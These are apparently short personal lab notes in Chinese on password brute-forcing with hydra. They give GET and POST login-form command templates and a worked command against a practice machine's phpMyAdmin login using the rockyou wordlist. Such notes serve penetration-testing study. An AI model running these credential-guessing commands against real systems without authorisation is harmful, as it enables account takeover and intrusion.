hydra密码爆破

GET请求：
hydra -L names.txt -P passwords.txt http-get://<IP>/login
或- l <name>， -p <password> 单个指定

POST请求：
hydra -L names.txt -P passwords.txt <IP> -s <PORT> http-post-form "/login.php:username=^USER^&password=^PASS^:invalid login"

例如本靶机中密码爆破使用的：

hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.203.133 -s 8080 http-post-form "/phpmyadmin/index.php?token=39b581acdf40442009317cf424b92bc7:pma_username=^USER^&pma_password=^PASS^&server=1&token=39b581acdf40442009317cf424b92bc7:#1045 无法登录MYSQL服务器"
